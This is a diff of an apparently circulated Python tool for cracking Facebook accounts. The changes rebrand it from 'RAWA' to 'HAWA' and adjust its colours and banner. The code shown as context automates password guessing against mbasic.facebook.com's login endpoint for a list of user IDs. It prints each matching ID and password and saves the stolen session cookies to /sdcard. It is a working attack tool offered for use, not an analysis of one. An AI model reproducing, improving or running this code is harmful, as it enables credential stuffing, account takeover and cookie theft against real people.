@@ -1071,15 +1071,18 @@ time.sleep(2)
 os.system(f'xdg-open https://t.me/GASHA_32')
 logo=("""
 
-        ########:::::'###::::'##:::::'##::::'###::::
- ##.... ##:::'## ##::: ##:'##: ##:::'## ##:::
- ##:::: ##::'##:. ##:: ##: ##: ##::'##:. ##::
- ########::'##:::. ##: ##: ##: ##:'##:::. ##:
- ##.. ##::: #########: ##: ##: ##: #########:
- ##::. ##:: ##.... ##: ##: ##: ##: ##.... ##:
- ##:::. ##: ##:::: ##:. ###. ###:: ##:::: ##:
-..:::::..::..:::::..:::...::...:::..:::::..::                         
+        $$$$$
+       $$$$$$$
+        $$$$$
+	  $
+          $ $ 
+	  $   $
+	  $
+          $
+	$.  $
+       $.    $
 
+       NEW TOOL BY HAWA
 """)
                                
 def linex():
@@ -1107,13 +1110,13 @@ def menu():
                 if "server on" in sj:
                         #clear()
                         #os.system('espeak -a 300 " Welcome,   to,  The,   Tools"')
-                        print('\x1b[1;94m [01] \x1b[1;95mCRACK FILE [ON]\n ')
+                        print('\33[1;96m [01] \x1b[1;95mCRACK FILE [ON]\n ')
                         linex()
                         xd=input('\033[1;36mOPTION :  ')
                         if xd in ['1','01']:
                                
                                 linex()
-                                file = input('\x1b[1;96m [😁] 𝐍𝐀𝐖𝐄 𝐅𝐈𝐋𝐄  : ')
+                                file = input('\033[32m [😁] 𝐍𝐀𝐖𝐄 𝐅𝐈𝐋𝐄  : ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
                                 except FileNotFoundError:
@@ -1122,13 +1125,13 @@ def menu():
                                         menu()
                                 clear()
                                 linex()
-                                print(f' \33[1;97m[\33[1;94m 1\33[1;97m ] \33[1;92m METHODE ➥ p.facebok')
+                                print(f' \33[1;97m[\33[1;94m 1\33[1;97m ] \33[1;92m METHODE MBASIC.FACEBOOK.COM')
                                 linex()
                                 mthd=input('\033[1;36mOPTION :  ')
                                 plist = []
                                 clear()
                                 linex()
-                                print('\x1b[1;93m 1. \x1b[1;92mALL PASSORD ')
+                                print('\x1b[1;87m 1. \x1b[1;92mALL PASSORD ')
                                 linex()
                                 ppp=input('OPTION :  ')
                                 if ppp in ['1','01']:
@@ -1264,7 +1267,7 @@ def menu():
 def ffb(ids,names,passlist):
         global loop,oks,cps,lim
         p=round(loop*100/lim,2)
-        sys.stdout.write('\x1b[1;95m [ RAWA-B-Api ]  %s  ~ \033[1;32m  ~ OK  %s\033[1;37m \x1b[1;91m    %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write('\x1b[0;34m [ HaWa⚡️🌪️ ]  %s  ~ \x1b[1;87m  • OK😱  %s\033[1;37m \x1b[1;91m    %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -1306,9 +1309,9 @@ def ffb(ids,names,passlist):
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         ASX=str(session.cookies)
                         if "c_user" in ASX:
-                                print('\033[1;30mRAWA-OK🖤] '+ids+' | '+pas+'\33[0;97m')
+                                print('\x1b[1;87mHAWA-OK🖤] '+ids+' | '+pas+'\33[0;97m')
                                 print("\033[1;92m[•] Cookie: "+coki)
-                                os.system('espeak -a 300 " RaWa,  OK,    ,ID   PASSWORD"')
+                                os.system('espeak -a 300 " HAWA,  OK,    ,ID   PASSWORD"')
                                 dc=dict(session.cookies)
                                 coki=";".join([k+"="+v for k,v in dc.items()])
                                 open('/sdcard/𝐗𝐔𝐋𝐀-COOKIE.txt','a').write(coki+'\n')
